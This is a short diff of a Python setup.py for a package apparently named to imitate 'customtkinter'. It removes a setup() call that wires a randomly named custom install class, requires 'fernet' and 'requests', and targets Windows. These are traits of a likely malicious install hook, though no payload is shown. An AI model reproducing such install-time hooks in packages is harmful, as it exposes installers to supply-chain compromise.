@@ -18,22 +18,5 @@ class RveYVoBPhZnPWsbLAKAGZwrGmXlvllguBqMlRMtzqIAtgMwykOQfnJPakKWxbclpZsftFAZyJQ
             install.run(self)
 
 
-setup(
-    name="customtkitenr",
-    version=VERSION,
-    author="xFtqwONcErAJmEnp",
-    author_email="HtWMDvvsuJFDnnVypAV@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': RveYVoBPhZnPWsbLAKAGZwrGmXlvllguBqMlRMtzqIAtgMwykOQfnJPakKWxbclpZsftFAZyJQmCDHHhzRztnlOeIxZMytezNUnydITuOPRTOPELaUqMbpcGbwvQPZVxkMPpqhdRjnWpKmUhZcUQajtHMzQloRwxYPXgJFqvxAomwDNgwJqRpprzLOyE,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
